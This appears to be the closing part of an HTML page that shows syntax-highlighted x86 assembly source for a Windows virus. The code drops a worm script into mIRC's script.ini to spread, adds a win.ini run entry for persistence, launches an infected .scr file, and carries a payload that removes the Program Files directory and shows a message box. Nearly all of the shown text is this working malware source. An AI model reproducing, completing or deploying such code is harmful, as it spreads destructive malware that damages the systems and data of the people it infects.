</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; create c:\mirc\script.ini</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc1">; read+write</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mirc</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save mirc handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">num_bytes_written</span><span class="sc0"> </span><span class="sc1">; write virus script code</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">scriptsize</span><span class="sc0"> </span><span class="sc1">; script size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">scriptini</span><span class="sc0"> </span><span class="sc1">; script</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; mirc handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mirc</span><span class="sc0"> </span><span class="sc1">; close mirc handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pazwinini</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc1">; get windoze directory</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winini</span><span class="sc0"> </span><span class="sc1">; win.ini file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pazwinini</span><span class="sc0"> </span><span class="sc1">; windoze dir </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0"> </span><span class="sc1">; copy</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pazwinini</span><span class="sc0"> </span><span class="sc1">; write win.ini</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">aza</span><span class="sc0"> </span><span class="sc1">; write win.ini way dr0peerr</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zapuskz</span><span class="sc0"> </span><span class="sc1">; write parameters run section </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windoze</span><span class="sc0"> </span><span class="sc1">; write windows section</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">runz</span><span class="sc0"> </span><span class="sc1">; jump runz</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; virus payload</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@prg</span><span class="sc0"> </span><span class="sc1">; kill program files directory</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RemoveDirectoryA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">title_</span><span class="sc0"> </span><span class="sc1">; title box</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0"> </span><span class="sc1">; message box</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
</span><span class="sc5">setdir</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nastoeh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mircdrop</span><span class="sc0"> </span><span class="sc1">; jump mircdrop</span><span class="sc0">
</span><span class="sc5">runz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; run the host_name file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">processi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startupi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; zer0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; current directory name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; null enviroment block</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; run host</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; inheritance flag</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'rcs'</span><span class="sc0"> </span><span class="sc1">; store file extension</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nashv</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0"> </span><span class="sc1">; execute scr file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; exit</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">azaco</span></div></body>
</html>
